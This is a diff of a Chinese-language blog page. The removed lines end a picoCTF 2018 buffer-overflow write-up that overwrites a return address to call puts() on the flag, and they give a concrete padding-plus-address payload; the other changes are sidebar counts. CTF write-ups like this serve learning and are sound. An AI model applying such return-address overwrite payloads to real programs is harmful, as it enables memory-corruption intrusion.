-
-
-<p>同理，其实我们也可以不依靠 sigsegv_handler() 函数，只要我们覆盖返回地址来调用 puts() 函数，再把 flag 所在地址作为参数，同样也可以打印出flag。</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/puts.jpg" class>
-
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/flag.png" class>
-
-<p>所以payload = ‘a’*0x1c + \xC0\x84\x04\x08 + \x00\x00\x00\x00 + \x80\xA0\x04\x08</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-4.jpg" class>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1284,14 +1274,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
